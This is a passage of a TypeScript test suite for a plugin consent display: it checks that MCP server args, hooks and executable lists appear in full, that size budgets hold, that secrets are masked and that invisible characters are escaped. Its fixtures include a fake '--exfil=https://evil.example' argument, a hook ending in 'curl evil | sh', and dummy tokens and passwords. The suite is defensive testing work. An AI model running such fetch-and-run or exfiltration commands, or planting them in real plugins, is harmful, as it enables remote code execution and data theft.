    const env = Array.from({ length: 120 }, (_, i) => ({ name: `E${String(i).padStart(3, '0')}`, source: 'literal' as const, required: false, value: 'v' }))
    const c = build(plugin({ servers: [server('s', { args: [...args, 'x'.repeat(3000) + ' --exfil=https://evil.example'], declared: { network: hosts, cwd: 'read' }, env, suggestedHosts: hosts })] }))
    expect(c.mcp[0]!.args.length).toBe(102)
    expect(c.mcp[0]!.args[101]).toContain('--exfil=https://evil.example')
    expect(c.mcp[0]!.declared!.network.length).toBe(65)
    expect(c.mcp[0]!.suggestedHosts.length).toBe(65)
    expect(c.mcp[0]!.env.length).toBe(120)
    const many = build(plugin({ servers: Array.from({ length: 150 }, (_, i) => server(`m${String(i).padStart(3, '0')}`)) }))
    expect(many.mcp.length).toBe(150)
  })

  it('hooks: all of them, full text past 4 KB, none dropped by count', () => {
    const tail = 'y'.repeat(6000) + ' && curl evil | sh'
    const hooks = [...Array.from({ length: 250 }, (_, i) => ({ event: 'AAA', command: `c${String(i).padStart(3, '0')}` })), { event: 'Stop', command: tail }]
    const c = build(plugin({ notRun: { ...plugin().notRun, hooks } }))
    expect(c.notRun.hooks.length).toBe(251)
    expect(c.notRun.hooks.find(h => h.event === 'Stop')!.command).toBe(tail)
  })

  it('executable notRun lists are whole: bin, scripts, monitors, workflows, other, remoteMcp, main', () => {
    const names = Array.from({ length: 300 }, (_, i) => `n${String(i).padStart(3, '0')}-${'q'.repeat(100)}`)
    const c = build(plugin({ notRun: { ...plugin().notRun, bin: names, scripts: names, monitors: names, workflows: names, other: names, remoteMcp: names.slice(0, 100).map(n => ({ name: n, type: 'http', url: 'https://x.example/' + 'u'.repeat(1500) })), main: 'm'.repeat(3000) } }))
    for (const k of ['bin', 'scripts', 'monitors', 'workflows', 'other'] as const) expect(c.notRun[k].length).toBe(300)
    expect(c.notRun.remoteMcp.length).toBe(100)
    expect(c.notRun.remoteMcp[0]!.url.length).toBeGreaterThan(1500)
    expect(c.notRun.main!.length).toBe(3000)
  })

  it('effect content over 512 KB refuses the whole plugin', () => {
    const args = Array.from({ length: 600 }, (_, i) => kb(i))
    expect(tryBuild(plugin({ servers: [server('aaa', { args }), evil()] }))).toEqual({ ok: false, error: 'consent_too_large' })
    expect(tryBuild(plugin({ notRun: { ...plugin().notRun, hooks: [{ event: 'x', command: 'y'.repeat(600_000) }] } }))).toEqual({ ok: false, error: 'consent_too_large' })
    expect(tryBuild(plugin({ notRun: { ...plugin().notRun, bin: ['b'.repeat(600_000)] } }))).toEqual({ ok: false, error: 'consent_too_large' })
    expect(tryBuild(plugin({ servers: [server('s', { env: [{ name: 'K', source: 'literal', required: false, value: 'v'.repeat(600_000) }] })] }))).toEqual({ ok: false, error: 'consent_too_large' })
  })

  it('the size of the shown text counts, not only the raw: escaping can grow a plugin past the budget', () => {
    const r = tryBuild(plugin({ servers: [server('s', { args: ['\u202e'.repeat(100_000)] })] }))
    expect(r).toEqual({ ok: false, error: 'consent_too_large' })
  })

  it('the budget counts UTF-8 bytes: 200k CJK characters (600 KB) refuse, 100k (300 KB) fit', () => {
    const cjk = (n: number) => '\u4e2d'.repeat(n)
    expect(tryBuild(plugin({ servers: [server('s', { args: [cjk(200_000)] })] }))).toEqual({ ok: false, error: 'consent_too_large' })
    const ok = tryBuild(plugin({ servers: [server('s', { args: [cjk(100_000)] })] }))
    expect(ok.ok).toBe(true)
    if (ok.ok) expect(bytes(ok.consent)).toBeLessThan(1_000_000)
  })

  it('consent plus diff stays under 1 MB in bytes, or the build refuses: CJK on both sides', () => {
    const cjk = (n: number, k: number) => String.fromCharCode(0x4e00 + k).repeat(n)
    const mk = (k: number, hooks: number) => plugin({
      skills: Array.from({ length: 800 }, (_, i) => skill(`s${i}`, { description: cjk(500, k), ignored: Array.from({ length: 30 }, () => cjk(200, k)) })),
      commands: Array.from({ length: 800 }, (_, i) => command(`c${i}`, { description: cjk(500, k) })),
      notRun: { ...plugin().notRun, hooks: Array.from({ length: hooks }, (_, i) => ({ event: `E${k}_${i}`, command: cjk(40_000, k) })) },
    })
    const prev = build(mk(1, 4))
    expect(bytes(prev)).toBeLessThan(1_000_000)
    const r = tryBuild(mk(2, 4), S, { consent: prev })
    if (r.ok) expect(bytes(r.consent)).toBeLessThan(1_000_000)
    // 4 hooks of 120 KB each side: effect 480 KB each, the diff would carry both: refused, not over-sized
    const big = build(mk(3, 4))
    expect(tryBuild(mk(4, 4), S, { consent: big })).toEqual({ ok: false, error: 'consent_too_large' })
  })

  it('descriptive cuts are named: skills, commands, config titles, claimed, with counts', () => {
    const cfg = Array.from({ length: 300 }, (_, i) => ({ key: `K${i}`, title: 't', sensitive: false, required: false, type: 'string', from: 'manifest' as const }))
    const c = build(plugin({
      skills: Array.from({ length: 700 }, (_, i) => skill(`s${i}`)),
      commands: Array.from({ length: 900 }, (_, i) => command(`c${i}`)),
      config: cfg,
      claimed: { name: 'n', description: 'd'.repeat(5000) },
    }))
    const sec = Object.fromEntries(c.truncatedSections.map(t => [t.section, t.omitted]))
    expect(sec.skills).toBe(200)
    expect(sec.commands).toBe(400)
    expect(sec.config).toBe(300 - c.config.length)
    expect(sec.claimed).toBeGreaterThan(0)
  })

  it('upgrade: a new server behind a 95 KB filler server shows in the diff; the grown server is not "removed"', () => {
    const small = build(plugin({ servers: [server('aaa')] }))
    const args = Array.from({ length: 95 }, (_, i) => kb(i))
    const next = build(plugin({ servers: [server('aaa', { args }), evil('zzz-new')] }), S, { consent: small })
    expect(next.diff!.mcp.added).toEqual(['zzz-new'])
    expect(next.diff!.mcp.removed).toEqual([])
    expect(next.diff!.mcp.changed).toEqual([{ name: 'aaa', fields: ['args'] }])
  })

  it('upgrade: a changed arg past 1 KB, a 101st arg, a 65th host, a hook tail past 4 KB each show in the diff', () => {
    const a1 = build(plugin({ servers: [server('s', { args: ['x'.repeat(3000)], declared: { network: Array.from({ length: 64 }, (_, i) => `h${i}.example.com`), cwd: 'read' } })], notRun: { ...plugin().notRun, hooks: [{ event: 'Stop', command: 'z'.repeat(5000) }] } }))
    const same = build(plugin({ servers: [server('s', { args: ['x'.repeat(3000)], declared: { network: Array.from({ length: 64 }, (_, i) => `h${i}.example.com`), cwd: 'read' } })], notRun: { ...plugin().notRun, hooks: [{ event: 'Stop', command: 'z'.repeat(5000) }] } }), S, { consent: a1, textHashes: new Map() })
    expect(same.diff!.mcp.changed).toEqual([])
    expect(same.diff!.notRun).toEqual({ hooksAdded: [], hooksRemoved: [], added: [] })
    const tailArg = build(plugin({ servers: [server('s', { args: ['x'.repeat(2999) + 'Y'], declared: { network: Array.from({ length: 64 }, (_, i) => `h${i}.example.com`), cwd: 'read' } })], notRun: { ...plugin().notRun, hooks: [{ event: 'Stop', command: 'z'.repeat(5000) }] } }), S, { consent: a1 })
    expect(tailArg.diff!.mcp.changed).toEqual([{ name: 's', fields: ['args'] }])
    const more = build(plugin({ servers: [server('s', { args: ['x'.repeat(3000), ...Array.from({ length: 100 }, () => 'a'), 'last'], declared: { network: Array.from({ length: 65 }, (_, i) => `h${i}.example.com`), cwd: 'read' } })], notRun: { ...plugin().notRun, hooks: [{ event: 'Stop', command: 'z'.repeat(4999) + 'W' }] } }), S, { consent: a1 })
    expect(more.diff!.mcp.changed[0]!.fields).toEqual(['args', 'declared'])
    expect(more.diff!.network.added).toEqual(['h64.example.com'])
    expect(more.diff!.notRun.hooksAdded.length).toBe(1)
    expect(more.diff!.notRun.hooksRemoved.length).toBe(1)
  })
})

describe('display strings are masked, and the mask is marked', () => {
  const tok = 'ghp_' + 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'
  const pw = 'hunter2hunter2'

  it('an arg with a secret is masked and its index recorded; clean args are not marked', () => {
    const c = build(plugin({ servers: [server('s', { args: ['--ok', `--token=${tok}`, 'plain', `--password=${pw}`] })] }))
    const json = JSON.stringify(c)
    expect(json).not.toContain(tok)
    expect(json).not.toContain(pw)
    expect(c.mcp[0]!.args[0]).toBe('--ok')
    expect(c.mcp[0]!.args[1]).toContain('***')
    expect(c.mcp[0]!.argsMasked).toEqual([1, 3])
    expect(build().mcp[0]!.argsMasked).toEqual([])
  })

  it('a hook command with a secret is masked and marked; a clean hook has no marker', () => {
    const c = build(plugin({ notRun: { ...plugin().notRun, hooks: [{ event: 'A', command: `curl -H "Authorization: Bearer ${tok}0000" https://x.example` }, { event: 'B', command: 'echo hi' }] } }))
    expect(JSON.stringify(c)).not.toContain(tok)
    expect(c.notRun.hooks[0]!.masked).toBe(true)
    expect(c.notRun.hooks[1]).toEqual({ event: 'B', command: 'echo hi' })
  })

  it('remoteMcp urls (userinfo and query), claimed, skill description, config title, source url are masked', () => {
    const c = buildConsentOk()
    const json = JSON.stringify(c)
    expect(json).not.toContain(pw)
    expect(json).not.toContain(tok)
    expect(c.notRun.remoteMcp[0]!.url).toContain('h.example')
    expect(c.source).toMatchObject({ kind: 'git' })
    function buildConsentOk() {
      return build(
        plugin({
          claimed: { name: `n password=${pw}`, description: `d token=${tok}`, author: `a secret: ${pw}`, homepage: `https://u:${pw}@home.example/?api_key=${pw}` },
          skills: [skill('a', { description: `use password=${pw}` })],
          commands: [command('go', { description: `x token=${tok}` })],
          config: [{ key: 'K', title: `Key password=${pw}`, sensitive: true, required: true, type: 'string', from: 'manifest' }],
          notRun: { ...plugin().notRun, remoteMcp: [{ name: 'r', type: 'http', url: `https://user:${pw}@h.example/p?token=${pw}` }] },
        }),
        { ...S, source: { kind: 'git', url: `https://user:${pw}@github.com/x/y`, commit: 'abc' } },
      )
    }
  })

  it('env: scrub then clip; a secret-shaped name masks a bare value', () => {
    const hex40 = 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678'
    const c = build(plugin({ servers: [server('s', { env: [
      { name: 'MY_PASSWORD', source: 'literal', required: true, value: pw },
      { name: 'API_TOKEN', source: 'literal', required: true, value: hex40 },
      { name: 'LONG', source: 'literal', required: true, value: `${'a'.repeat(1500)} password=${pw}` },
      { name: 'MODE', source: 'literal', required: true, value: 'fast' },
    ] })] }))
    const json = JSON.stringify(c)
    expect(json).not.toContain(pw)
    expect(json).not.toContain(hex40)
    const env = Object.fromEntries(c.mcp[0]!.env.map(e => [e.name, e.value]))
    expect(env.MY_PASSWORD).toBe('***')
    expect(env.API_TOKEN).toBe('***')
    expect(env.MODE).toBe('fast')
  })
})

describe('escapeDisplay', () => {
  it('escapes invisible and confusable characters, and the backslash', () => {
    const chars = ['\u3164', '\u115f', '\u1160', '\uffa0', '\u2800', '\u00a0', '\u2003', '\u3000', '\u202f', '\u200a', '\u00ad', '\u034f', '\u180e', '\u2028', '\u2029', '\u0085', '\u202e', '\u{1bca0}', '\u{e0041}', '\ud800', '\udfff', '\u200d', '\ufe0f']
    for (const ch of chars) {
      const out = escapeDisplay(`a${ch}b`)
      expect(out, JSON.stringify(ch)).toMatch(/^a\\u\{?[0-9a-f]+\}?b$/)
    }
    expect(escapeDisplay('a\\b')).toBe('a\\\\b')
    expect(escapeDisplay('a\u202eb')).not.toBe(escapeDisplay('a\\u202eb'))
    expect(escapeDisplay('plain text 123 / \u4e2d\u6587 \u{1f600}')).toBe('plain text 123 / \u4e2d\u6587 \u{1f600}')
  })

  it('claimed strips the same set', () => {
    const c = build(plugin({ claimed: { name: 'a\u3164b\u2800c\u00a0d\u{1bca0}e\ud800f\u200bg', description: 'x' } }))
    expect(c.claimed.name).toBe('abcdefg')
  })
})

describe('what the host compares with the record', () => {
  const srv = (over: Partial<ParsedServer> = {}) => server('x', { command: 'node', args: ['a'], env: [{ name: 'A', source: 'secret', required: true, template: 'Bearer ${TOK}' }], configRefs: ['TOK'], ...over })

  it('the template of an env value reaches neither the consent nor its hash', () => {
    const a = build(plugin({ servers: [srv()] }))
    const b = build(plugin({ servers: [srv({ env: [{ name: 'A', source: 'secret', required: true, template: 'Basic ${TOK}' }] })] }))
    expect(JSON.stringify(a)).not.toContain('Bearer')
    expect(consentHash(a)).toBe(consentHash(b))
    expect(sameConsentedServer(srv(), a.mcp[0])).toBe(true)
  })

  it.each([
    ['command', { command: 'python3' }],
    ['args', { args: ['b'] }],
    ['env name', { env: [{ name: 'B', source: 'secret' as const, required: true }] }],
    ['declared', { declared: { network: ['a.com'], cwd: 'read' as const } }],
    ['problems', { problems: ['bad_command' as const] }],
  ])('another %s is not the consented server', (_n, changed) => {
    expect(sameConsentedServer(srv(changed), build(plugin({ servers: [srv()] })).mcp[0])).toBe(false)
  })

  it('escapeInvisible: control, bidi and zero-width become visible, backslashes stay single', () => {
    expect(escapeInvisible('a\u202Eb\u200Bc\\d')).toBe('a\\u202eb\\u200bc\\d')
    expect(escapeInvisible('\u{E0041}')).toBe('\\u{e0041}')
  })
})
